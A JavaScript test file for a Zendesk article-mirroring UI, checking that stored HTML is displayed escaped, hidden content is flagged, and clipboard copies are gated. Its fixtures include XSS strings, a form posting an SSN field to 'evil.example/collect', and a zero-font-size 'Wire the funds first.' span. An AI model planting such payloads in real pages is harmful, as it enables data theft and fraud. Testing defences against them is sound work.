    expect(out).toContain("Mirror ▾");
    expect(out).toContain("Import files…");
    expect(out).toContain("Import folder…");
    expect(out).toContain("Delete all mirrored content…");
    expect(out).toContain("Delete mirrored articles…");
    expect(out).toContain("Delete mirrored macros…");
    expect(out).toContain("Delete imported content only…");
    expect(out).toContain("real Zendesk is never touched");
    // imports first, then the divider, then the purge scopes
    expect(out.indexOf("Import files…")).toBeLessThan(out.indexOf("Import folder…"));
    expect(out.indexOf("Import folder…")).toBeLessThan(out.indexOf("zd-menu-divider"));
    expect(out.indexOf("zd-menu-divider"))
      .toBeLessThan(out.indexOf("Delete all mirrored content…"));
    // no standalone import buttons left in the header outside the menu
    const beforeMenu = out.slice(0, out.indexOf("zd-menu"));
    expect(beforeMenu).not.toContain("Import files…");
    expect(beforeMenu).not.toContain("Import folder…");
  });

  it("Import files / Import folder still fire through the menu", () => {
    const fired = [];
    const tree = GardenChrome({
      ...chromeProps,
      onImport: () => fired.push("files"),
      onImportFolder: () => fired.push("folder"),
      onPurge: noop,
    });
    const items = collectElements(
      tree, (n) => n.props && n.props.className === "zd-menu-item");
    expect(items).toHaveLength(2);
    const ev = { currentTarget: { closest: () => null } };
    items.forEach((b) => b.props.onClick(ev));
    expect(fired).toEqual(["files", "folder"]);
  });

  it("menu items ask for exactly the js_purge_mirror scopes, in order", () => {
    const scopes = [];
    const tree = GardenChrome({ ...chromeProps, onPurge: (s) => scopes.push(s) });
    const items = collectElements(
      tree, (n) => n.props && n.props.className === "zd-menu-item danger");
    expect(items).toHaveLength(4);
    const ev = { currentTarget: { closest: () => null } };
    items.forEach((b) => b.props.onClick(ev));
    expect(scopes).toEqual(["all", "articles", "macros", "imported"]);
  });

  it("every menu item disables while an import/pull claim is busy", () => {
    const busy = renderToStaticMarkup(
      <GardenChrome {...chromeProps} onPurge={noop} pullBusy />);
    expect(busy).toContain('class="zd-menu-item" role="menuitem" disabled');
    expect(busy).toContain('class="zd-menu-item danger" role="menuitem" disabled');
    expect(busy).not.toContain('class="zd-menu-item" role="menuitem" title');
  });

  it("without onPurge the menu still carries the imports (no purge, no divider)", () => {
    const out = renderToStaticMarkup(<GardenChrome {...chromeProps} />);
    expect(out).toContain("Mirror ▾");
    expect(out).toContain("Import files…");
    expect(out).toContain("Import folder…");
    expect(out).not.toContain("Delete all mirrored content…");
    expect(out).not.toContain("zd-menu-divider");
  });
});

// ── THE CLIPBOARD INVARIANT, renderer half ───────────────────────────
//
// Python guarantees that only reviewed bytes reach the clipboard. That is
// only worth anything if the reviewer was actually SHOWN those bytes, so
// the renderer must (a) render the authoritative SOURCE diff, (b) label the
// readable projection as secondary rather than presenting it as the review,
// (c) surface the markup notice and the zero-change warning, and (d) render
// every one of those strings as escaped text, never as markup.

describe("RevisionDiff — source review is authoritative", () => {
  const HIDDEN = '<p><span style="font-size: 0">Wire the funds first.</span></p>';
  const diff = {
    request_id: "d-1", kind: "article", draft_id: 5, baseline_present: true,
    change_count: 2, bytes_equal: false, warning: null, markup_notice: "",
    title: { changed: false, old: "T", new: "T" },
    rows: [
      { tag: "del", text: "<p>Wire the funds first.</p>",
        spans: [{ tag: "del", text: "<p>Wire the funds first.</p>" }] },
      { tag: "add", text: HIDDEN, spans: [{ tag: "add", text: HIDDEN }] },
    ],
    text_rows: [{ tag: "equal", text: "Wire the funds first." }],
    text_change_count: 0,
  };

  it("renders the source rows and labels them authoritative", () => {
    const out = renderToStaticMarkup(<RevisionDiff diff={diff} />);
    expect(out).toContain("Source review (authoritative)");
    expect(out).toContain("2 changed lines vs the mirror");
    // the smuggled style attribute is literally on screen, escaped
    expect(out).toContain("font-size: 0");
    expect(out).toContain("&lt;span");
    expect(out).not.toContain("<span style");
  });

  it("labels the readable projection as SECONDARY, never as the review", () => {
    const out = renderToStaticMarkup(<RevisionDiff diff={diff} />);
    expect(out).toContain("Readable text (secondary view");
    expect(out).toContain("NOT what the clipboard delivers");
    expect(out).toContain("never approve a revision from this pane alone");
    // and the source pane comes FIRST
    expect(out.indexOf("Source review (authoritative)"))
      .toBeLessThan(out.indexOf("Readable text (secondary view"));
  });

  it("new content still renders its source rows (no early empty return)", () => {
    const out = renderToStaticMarkup(
      <RevisionDiff diff={{ ...diff, baseline_present: false }} />);
    expect(out).toContain("no mirrored baseline");
    expect(out).toContain("font-size: 0");     // the bytes are STILL shown
  });

  it("surfaces the zero-change warning instead of an innocent count", () => {
    const out = renderToStaticMarkup(
      <RevisionDiff diff={{ ...diff, change_count: 0, rows: [],
                            warning: "The stored bytes differ from the "
                              + "baseline but the source diff found no "
                              + "changed line. Do NOT copy this revision "
                              + "- report it." }} />);
    expect(out).toContain("zd-diff-warn");
    expect(out).toContain("Do NOT copy this revision");
  });

  it("surfaces the markup notice for bytes the preview cannot display", () => {
    const out = renderToStaticMarkup(
      <RevisionDiff diff={{ ...diff,
        markup_notice: "this content contains markup the preview does not "
          + "display - read the HTML source before pasting" }} />);
    expect(out).toContain("preview does not display");
    // the shared alert component, worded for a diff: the exact rows below
    // ARE the authority here, so it points at them rather than at a
    // disclosure to open
    expect(out).toContain("zd-markup-alert");
    expect(out).toContain('role="alert"');
    expect(out).toContain("The source rows below are the authority");
    expect(out).not.toContain("Show exact source");   // nothing to expand
  });

  it("renders no alert element at all when the notice is empty", () => {
    const out = renderToStaticMarkup(<RevisionDiff diff={diff} />);
    expect(out).not.toContain("zd-markup-alert");
  });

  it("hostile warning / notice strings render escaped", () => {
    const out = renderToStaticMarkup(
      <RevisionDiff diff={{ ...diff, warning: "<img src=x onerror=alert(1)>",
                            markup_notice: "<script>x()</script>" }} />);
    expect(out).not.toContain("<img");
    expect(out).not.toContain("<script>x()");
    expect(out).toContain("&lt;img");
    expect(out).toContain("&lt;script&gt;");
  });
});

describe("SourcePanel — collapsed source disclosure", () => {
  const RAW = '<h2>Guide</h2><form action="https://evil.example/collect">'
    + '<input name="ssn"></form><script>steal()</script>';

  it("is a <details> disclosure that is CLOSED by default (the rendered "
     + "article is the primary surface and must not be pushed out of view)", () => {
    const out = renderToStaticMarkup(<SourcePanel source={RAW} />);
    expect(out).toContain("<details");
    expect(out).toContain("<summary");
    expect(out).not.toContain("<details open");
    expect(out).not.toContain('open=""');
  });

  it("labels the summary as what the clipboard delivers", () => {
    const out = renderToStaticMarkup(<SourcePanel source={RAW} />);
    expect(out).toContain("HTML source");
    expect(out).toContain("clipboard");
    expect(out).toContain("chars");            // size hint on the summary
  });

  // F5. The disclosure used to be reachable in practice only via the markup
  // alert, and that alert is silent for every content-HIDING vector. The
  // summary must therefore be a control in its own right: permanently
  // visible, naming the action, with no dependence on a notice.
  it("carries an ALWAYS-visible named action, notice or no notice", () => {
    const closed = renderToStaticMarkup(<SourcePanel source={RAW} />);
    expect(closed).toContain("zd-source-action");
    expect(closed).toContain("Show source");
    // and it is not a function of the notice
    expect(closed).not.toContain("zd-source-flag");
    const open = renderToStaticMarkup(<SourcePanel source={RAW} open />);
    expect(open).toContain("zd-source-action");
    expect(open).toContain("Hide source");
  });

  it("says why the source matters even before it is expanded", () => {
    const out = renderToStaticMarkup(<SourcePanel source={RAW} />);
    expect(out).toContain("zd-source-why");
    expect(out).toContain("every stored character");
    expect(out).toContain("hides from a reader");
  });

  it("keeps the summary the ONLY focusable control (no nested button)", () => {
    const tree = SourcePanel({ source: RAW, notice: "n", open: true });
    const btns = collectElements(tree, (n) => n.type === "button");
    expect(btns).toHaveLength(0);
  });

  it("flags a live notice on the summary so a COLLAPSED panel still warns", () => {
    const out = renderToStaticMarkup(
      <SourcePanel source={RAW} notice="markup the preview cannot display" />);
    expect(out).toContain("zd-source-flag");
    expect(out).toContain("Preview is incomplete");
    expect(out).toContain("zd-source-panel noticed");
  });

  it("still shows the exact stored bytes as escaped text when expanded", () => {
    const out = renderToStaticMarkup(<SourcePanel source={RAW} open />);
    expect(out).toMatch(/<details[^>]*open=""/);
    expect(out).toContain("&lt;form");
    expect(out).toContain("&lt;script&gt;");
    expect(out).toContain("evil.example/collect");
    // never live markup — that is what the sandboxed preview iframe is for
    expect(out).not.toContain("<form");
    expect(out).not.toContain("<script>steal");
  });

  it("reports its open state back to the owner (controlled disclosure)", () => {
    const seen = [];
    const tree = SourcePanel({ source: RAW, onToggle: (v) => seen.push(v) });
    expect(tree.type).toBe("details");
    tree.props.onToggle({ currentTarget: { open: true } });
    tree.props.onToggle({ currentTarget: { open: false } });
    expect(seen).toEqual([true, false]);
  });

  it("repeats the markup notice inside the disclosure", () => {
    const out = renderToStaticMarkup(
      <SourcePanel source={RAW} open
                   notice="this content contains markup the preview does not display" />);
    expect(out).toContain("zd-diff-warn");
    expect(out).toContain("preview does not display");
  });

  it("takes a custom label (macro actions) and degrades with no source", () => {
    expect(renderToStaticMarkup(<SourcePanel label="Macro action source" />))
      .toContain("Macro action source");
    expect(renderToStaticMarkup(<SourcePanel />)).toContain("zd-source");
    // the always-visible control survives the degraded cases too
    expect(renderToStaticMarkup(<SourcePanel />)).toContain("Show source");
  });
});

describe("MarkupAlert — meaningful even when it fires constantly", () => {
  const NOTICE = "this content contains markup the preview does not display "
    + "- read the HTML source before pasting";

  it("renders NOTHING without a notice (no permanent banner)", () => {
    expect(MarkupAlert({ notice: "" })).toBe(null);
    expect(MarkupAlert({ notice: null })).toBe(null);
    expect(renderToStaticMarkup(<MarkupAlert notice="" />)).toBe("");
  });

  it("is an alert with a jump into the source disclosure when it fires", () => {
    const shown = [];
    const out = renderToStaticMarkup(
      <MarkupAlert notice={NOTICE} onShowSource={() => shown.push(1)} />);
    expect(out).toContain('role="alert"');
    expect(out).toContain("zd-markup-alert");
    expect(out).toContain("preview does not display");
    expect(out).toContain("Show exact source");

    const tree = MarkupAlert({ notice: NOTICE, onShowSource: () => shown.push(1) });
    const btns = collectElements(tree, (n) => n.type === "button");
    expect(btns).toHaveLength(1);
    btns[0].props.onClick();
    expect(shown).toEqual([1]);
  });

  // Python now marks hidden content instead of dropping it silently, so this
  // fires on a large share of pulled articles. A block that repeats one
  // generic red sentence becomes wallpaper; these three parts are what keep
  // it readable on the hundredth article.
  it("separates the stake, the SPECIFIC finding, and the next action", () => {
    const out = renderToStaticMarkup(<MarkupAlert notice={NOTICE} />);
    expect(out).toContain("zd-markup-alert-hd");     // what is at stake
    expect(out).toContain("not a faithful view");
    expect(out).toContain("zd-markup-alert-text");   // the server's finding
    expect(out).toContain(NOTICE);
    expect(out).toContain("zd-markup-alert-what");   // what to do about it
    expect(out).toContain("marked in the preview");
    expect(out).toContain("before you copy or paste");
  });

  it("the specific notice is surfaced verbatim, never summarised away", () => {
    const specific = "a hidden block (display:none) carries text a reader "
      + "never sees";
    const out = renderToStaticMarkup(<MarkupAlert notice={specific} />);
    expect(out).toContain(specific);
  });

  it("lets a caller reword it for a surface that is not a preview", () => {
    const out = renderToStaticMarkup(
      <MarkupAlert notice={NOTICE} headline="H" detail="D"
                   actionLabel="A" onShowSource={noop} />);
    expect(out).toContain(">H<");
    expect(out).toContain(">D<");
    expect(out).toContain(">A<");
    expect(out).not.toContain("not a faithful view");
  });

  it("hostile notice strings render escaped", () => {
    const out = renderToStaticMarkup(
      <MarkupAlert notice='<img src=x onerror="alert(1)">' />);
    expect(out).not.toContain("<img");
    expect(out).toContain("&lt;img");
  });
});

// ── F5: THE EXACT BYTES MUST NOT BE GATED ON THE NOTICE ──────────────
//
// Confirmed defect: the source disclosure auto-expanded ONLY via
// MarkupAlert, and MarkupAlert is driven solely by markup_notice — which
// measures what the preview sanitizer REMOVED, never what it kept but will
// not paint. It was proven silent for display:none, visibility:hidden,
// opacity:0, font-size:0, white-on-white, off-screen positioning,
// zero-height clipping, text-indent, full-viewport decoy overlays, HTML
// comments and attribute payloads. So the operator's route to the exact
// characters is now independent of the notice, and these lock that.
describe("CopyControls — the source route sits beside the copy buttons", () => {
  const items = [{ field: "body_html", label: "Copy HTML source" }];
  const base = { primaryLabel: "Copy content", primaryField: COPY_DRAFTED_FIELD,
    items, onCopy: noop };

  it("renders a named View exact source control when given onShowSource", () => {
    const out = renderToStaticMarkup(
      <CopyControls {...base} onShowSource={noop} />);
    expect(out).toContain("zd-source-cta");
    expect(out).toContain("View exact source");
  });

  it("states which way it will move", () => {
    const label = (props) => {
      const tree = CopyControls({ ...base, onShowSource: noop, ...props });
      return collectElements(tree, (n) => n.type === "button").find(
        (b) => String(b.props.className || "").includes("zd-source-cta")
      ).props.children;
    };
    expect(label({})).toBe("View exact source");
    expect(label({ sourceOpen: true })).toBe("Hide exact source");
  });

  it("is NEVER disabled — not by a pending confirm, not by a closed gate. "
     + "Reading bytes is not releasing them, and a closed copy gate is "
     + "exactly when someone most needs to read them", () => {
    [{ pending: true }, { disabled: true }, { pending: true, disabled: true }]
      .forEach((state) => {
        const tree = CopyControls({ ...base, ...state, onShowSource: noop });
        const btns = collectElements(tree, (n) => n.type === "button");
        const cta = btns.filter(
          (b) => String(b.props.className || "").includes("zd-source-cta"));
        expect(cta).toHaveLength(1);
        expect(cta[0].props.disabled).toBeFalsy();
      });
  });

  it("does not touch the copy path: it asks onShowSource, never onCopy", () => {
    const copied = [];
    const shown = [];
    const tree = CopyControls({ ...base, onCopy: (f) => copied.push(f),
      onShowSource: () => shown.push(1) });
    const cta = collectElements(tree, (n) => n.type === "button").find(
      (b) => String(b.props.className || "").includes("zd-source-cta"));
    cta.props.onClick({ currentTarget: {} });
    expect(shown).toEqual([1]);
    expect(copied).toEqual([]);
  });

  it("is absent when the owner supplies no handler (macros in the diff pane, "
     + "the Revision Center, tests) — never a dead control", () => {
    const out = renderToStaticMarkup(<CopyControls {...base} />);
    expect(out).not.toContain("zd-source-cta");
    expect(out).not.toContain("View exact source");
  });
});

describe("Editors hand the source route to their copy row", () => {
  const article = {
    id: 105, title: "T", body_srcdoc: "<p>b</p>", body_source: "<p>b</p>",
    markup_notice: "", body_text: "b", author: "", category: "C", draft: false,
    html_url: "", labels: [], origin: "pull", outdated: false, position: 1,
    section: "S", section_id: 9, source_file: "", updated_display: "x",
    revisions: [],
  };
  const macro = {
    id: 201, name: "M", description: "", active: true, updated_display: "x",
    revisions: [], actions: [{ field: "comment_value", display: "C", value: "Hi." }],
  };

  it("ArticleEditor forwards onShowSource/sourceOpen to CopyControls", () => {
    const shown = [];
    const tree = ArticleEditor({ article, onBack: noop, onCopy: noop,
      onOpenRevision: noop, onShowSource: () => shown.push(1), sourceOpen: true });
    const controls = collectElements(tree, (n) => n.type === CopyControls);
    expect(controls).toHaveLength(1);
    expect(controls[0].props.sourceOpen).toBe(true);
    controls[0].props.onShowSource();
    expect(shown).toEqual([1]);
  });

  it("MacroEditor forwards it too (macro action source is a mirror row)", () => {
    const shown = [];
    const tree = MacroEditor({ macro, onBack: noop, onCopy: noop,
      onOpenRevision: noop, onShowSource: () => shown.push(1) });
    const controls = collectElements(tree, (n) => n.type === CopyControls);
    expect(controls[0].props.sourceOpen).toBe(false);
    controls[0].props.onShowSource();
    expect(shown).toEqual([1]);
  });

  it("the article preview note no longer claims the preview is faithful", () => {
    const out = renderToStaticMarkup(
      <ArticleEditor article={article} onBack={noop} onCopy={noop}
                     onOpenRevision={noop} onShowSource={noop} />);
    expect(out).toContain("marked in the preview");
    expect(out).toContain("View exact source");
    expect(out).toContain("read it before you copy");
  });
});

describe("ArticleBody marks content the stored markup hides from readers", () => {
  // Python wraps previously-invisible content in a marker rather than
  // letting it render invisibly. The frame stylesheet is the other half of
  // that contract: the marker has to be visibly DIFFERENT from normal
  // article content, and the hiding declarations inside it have to lose.
  const out = renderToStaticMarkup(<ArticleBody srcdoc="<p>x</p>" />);

  it("honours both marker forms of the contract", () => {
    expect(out).toContain("data-alma-hidden");
    expect(out).toContain("alma-hidden-source");
  });

  it("gives the marker a distinguishing rule and a muted label", () => {
    expect(out).toContain("dashed");
    expect(out).toContain("Hidden in the stored source");
    expect(out).toContain("a Zendesk reader does not see this");
    // the per-instance reason Python may attach rides the label
    expect(out).toContain("attr(data-alma-hidden)");
  });

  it("neutralises the hiding declarations INSIDE the marker only", () => {
    expect(out).toContain("visibility: visible !important");
    expect(out).toContain("opacity: 1 !important");
    expect(out).toContain("position: static !important");
    expect(out).toContain("text-indent: 0 !important");
    expect(out).toContain("max-height: none !important");
    expect(out).toContain("font-size: inherit !important");
    // scoped: no blanket override of ordinary article markup
    expect(out).not.toMatch(/\.article-body \*\s*\{[^}]*!important/);
  });

  it("still an empty sandbox with the marker rules in place", () => {
    expect(out).toContain('sandbox=""');
    expect(out).not.toContain("allow-scripts");
  });
});

describe("ZendeskApp wires the source panel next to every article/macro", () => {
  // The editors render the preview; without this panel the only on-screen
  // view of a mirror row would omit exactly the markup an attacker planted,
  // which is variant 3's "dishonest rendering" half. Collapsing the panel
  // (owner correction) does not weaken that: the review record is made by
  // the SERVED payload, not by the pixels. The article and macro branches
  // sit behind hooks + a live bridge, so guard them the way the repo guards
  // its Python trust boundaries: structurally, over the source.
  const src = readFileSync(
    new URL("./ZendeskApp.jsx", import.meta.url), "utf-8");

  it("exports one SourcePanel and imports it rather than re-implementing", () => {
    expect(typeof SourcePanel).toBe("function");
    expect(src).toContain(
      'import { MarkupAlert, SourcePanel } from "./RevisionDiff.jsx"');
  });

  it("the article branch feeds it body_source + markup_notice", () => {
    expect(src).toContain("source={article.body_source}");
    expect(src).toContain("notice={article.markup_notice}");
  });

  it("the macro branch feeds it the canonical actions source", () => {
    expect(src).toContain("source={macro.actions_source}");
  });

  it("keeps the disclosure controlled and CLOSED whenever a row opens", () => {
    expect(src).toContain("const [sourceOpen, setSourceOpen] = useState(false)");
    expect(src).toContain("open={sourceOpen} onToggle={setSourceOpen}");
    // every path that swaps the open row re-collapses it
    expect(src.match(/setSourceOpen\(false\)/g).length).toBeGreaterThanOrEqual(4);
  });

  // F5. Two independent routes into the exact bytes. The markup alert is one
  // of them, but it cannot be the only one: markup_notice is silent for every
  // content-HIDING vector, so an operator could otherwise reach a copy
  // decision having seen a rendered view that omitted the payload.
  it("the markup alert opens the disclosure — and only ever OPENS it", () => {
    expect(src).toContain("onShowSource={revealSource}");
    expect(src).toMatch(/function revealSource\(\)\s*\{\s*setSourceOpen\(true\);/);
    // an alert whose button could re-close what it points at is a trap
    expect(src).not.toMatch(/function revealSource\(\)[^}]*setSourceOpen\(false\)/);
  });

  it("both editors get an always-available toggle that does NOT depend on "
     + "the notice", () => {
    expect(src).toContain("function toggleSource()");
    // article editor and macro editor, both wired to the same state
    expect(src.match(/onShowSource=\{toggleSource\} sourceOpen=\{sourceOpen\}/g))
      .toHaveLength(2);
  });

  it("never renders untrusted HTML directly (CI guardrail, restated here)", () => {
    expect(src).not.toContain("dangerouslySetInnerHTML");
    expect(src).not.toContain("innerHTML");
  });
});

// ── THE COPY AFFORDANCE (owner correction, 2026-07-26) ───────────────
// Specialists copy DRAFTED CONTENT, not verbatim HTML. The primary button
// asks for the drafted field; the exact-bytes flavours ride an overflow.
// And because a copy of page-authored bytes now opens a NATIVE confirm
// inside js_copy_field, nothing on this side may double-prompt or imply the
// clipboard was written before Python resolves.
describe("CopyControls — primary drafted content, secondary exact bytes", () => {
  const items = [
    { field: "title", label: "Copy title" },
    { field: "body_html", label: "Copy HTML source" },
    { field: "body_rich", label: "Copy rich text" },
  ];
  const base = { primaryLabel: "Copy content", primaryField: COPY_DRAFTED_FIELD,
    items, onCopy: noop };

  it("renders ONE primary button (the drafted content) and demotes the "
     + "exact-byte flavours into an overflow menu", () => {
    const out = renderToStaticMarkup(<CopyControls {...base} />);
    expect(out).toContain('class="zd-btn primary"');
    expect(out).toContain("Copy content");
    // the demoted flavours are menu items, not co-equal buttons
    expect(out).toContain('class="zd-menu-item"');
    expect(out).toContain("Copy HTML source");
    expect(out).toContain("Copy rich text");
    expect(out).not.toContain('class="zd-btn">Copy HTML');
    expect(out).not.toContain('class="zd-btn">Copy rich text');
  });

  it("the primary asks for the drafted field; menu items ask for theirs", () => {
    const asked = [];
    const tree = CopyControls({ ...base, onCopy: (f) => asked.push(f) });
    const btns = collectElements(tree, (n) => n.type === "button");
    btns.forEach((b) => b.props.onClick({ currentTarget: {} }));
    expect(asked).toEqual(["body_text", "title", "body_html", "body_rich"]);
    expect(asked[0]).toBe(COPY_DRAFTED_FIELD);
  });

  it("pending disables every copy control and says the confirm is open — "
     + "no second prompt, and no claim that anything was copied", () => {
    const out = renderToStaticMarkup(<CopyControls {...base} pending />);
    expect(out).toContain('role="status"');
    expect(out).toContain("Waiting for the copy confirmation");
    expect(out).not.toContain("Copied");
    const disabled = (out.match(/disabled=""/g) || []).length;
    expect(disabled).toBe(4);                 // primary + 3 menu items
  });

  it("disabled (gate closed) also blocks the overflow", () => {
    const out = renderToStaticMarkup(<CopyControls {...base} disabled />);
    expect((out.match(/disabled=""/g) || []).length).toBe(4);
    expect(out).not.toContain('role="status"');
  });
});

describe("ArticleEditor copy affordance", () => {
  const article = {
    id: 105, title: "Importing client rosters", body_srcdoc: "<p>b</p>",
    body_source: "<p>b</p>", markup_notice: "", body_text: "b", author: "",
    category: "C", draft: false, html_url: "", labels: [], origin: "pull",
    outdated: false, position: 1, section: "S", section_id: 9,
    source_file: "", updated_display: "Jul 1, 2026", revisions: [],
  };

  it("Copy content is the primary; title/HTML/rich are in the overflow", () => {
    const out = renderToStaticMarkup(
      <ArticleEditor article={article} onBack={noop} onCopy={noop}
                     onOpenRevision={noop} />);
    expect(out).toContain('class="zd-btn primary"');
    expect(out).toContain("Copy content");
    expect(out).toContain('class="zd-menu-item"');
    expect(out).toContain("Copy HTML source");
    expect(out).toContain("Copy title");
  });

  it("Copy content asks for the drafted field", () => {
    const asked = [];
    const tree = ArticleEditor({ article, onBack: noop, onOpenRevision: noop,
      onCopy: (f) => asked.push(f) });
    const controls = collectElements(tree, (n) => n.type === CopyControls);
    expect(controls).toHaveLength(1);
    expect(controls[0].props.primaryField).toBe(COPY_DRAFTED_FIELD);
    controls[0].props.onCopy(controls[0].props.primaryField);
    expect(asked).toEqual(["body_text"]);
  });

  it("copyBusy propagates as the pending state (no double prompt)", () => {
    const tree = ArticleEditor({ article, onBack: noop, onCopy: noop,
      onOpenRevision: noop, copyBusy: true });
    const controls = collectElements(tree, (n) => n.type === CopyControls);
    expect(controls[0].props.pending).toBe(true);
  });

  it("the preview note describes a rendered article, not a stripped one", () => {
    const out = renderToStaticMarkup(
      <ArticleEditor article={article} onBack={noop} onCopy={noop}
                     onOpenRevision={noop} />);
    expect(out).toContain("Rendered preview");
    expect(out).toContain("sandboxed");
    expect(out).toContain("HTML source");
  });
});

describe("ZendeskApp copy plumbing (structural — hooks + live bridge)", () => {
  const src = readFileSync(
    new URL("./ZendeskApp.jsx", import.meta.url), "utf-8");

  it("arms a self-clearing busy flag before every bridge copy", () => {
    expect(src).toContain("function armCopyBusy()");
    expect(src).toContain("setTimeout(() => setCopyBusy(false), 30000)");
    const arms = src.match(/armCopyBusy\(\);\s+bridge\.copyField/g) || [];
    expect(arms).toHaveLength(3);            // article, macro, draft
  });

  it("announces a copy ONLY from copy_resolved, via the pure builder", () => {
    expect(src).toContain("clearCopyBusy();");
    expect(src).toContain("showFlash(copyFlashText(p));");
    // no optimistic success text anywhere in the live paths
    expect(src).not.toContain('showFlash("Copied ');
    expect(src).not.toContain("showFlash(`Copied ");
  });

  it("the demo path says the copy was simulated, never that it happened", () => {
    expect(src).toContain("simulated in the demo — nothing reached the clipboard");
  });

  it("passes copyBusy down to every copy surface", () => {
    expect(src).toContain("copyBusy={copyBusy}");
    // Revision Center, article editor, macro editor
    expect(src.match(/copyBusy=\{copyBusy\}/g)).toHaveLength(3);
  });
});

describe("MacroEditor copy affordance", () => {
  const macro = {
    id: 201, name: "Refund apology", description: "", active: true,
    updated_display: "Jul 1, 2026", revisions: [],
    actions: [{ field: "comment_value", display: "Comment/Reply", value: "Hi." }],
  };

  it("leads with the drafted reply and demotes the macro name", () => {
    const tree = MacroEditor({ macro, onBack: noop, onCopy: noop,
      onOpenRevision: noop });
    const controls = collectElements(tree, (n) => n.type === CopyControls);
    expect(controls).toHaveLength(1);
    expect(controls[0].props.primaryField).toBe("macro_reply");
    expect(controls[0].props.items.map((i) => i.field)).toEqual(["macro_name"]);
    const out = renderToStaticMarkup(
      <MacroEditor macro={macro} onBack={noop} onCopy={noop} onOpenRevision={noop} />);
    expect(out).toContain('class="zd-btn primary"');
    expect(out).toContain("Copy reply");
    expect(out).toContain('class="zd-menu-item"');
  });

  it("a macro with no reply action disables the copy affordance entirely", () => {
    const tree = MacroEditor({ macro: { ...macro, actions: [] }, onBack: noop,
      onCopy: noop, onOpenRevision: noop });
    const controls = collectElements(tree, (n) => n.type === CopyControls);
    expect(controls[0].props.disabled).toBe(true);
  });
});
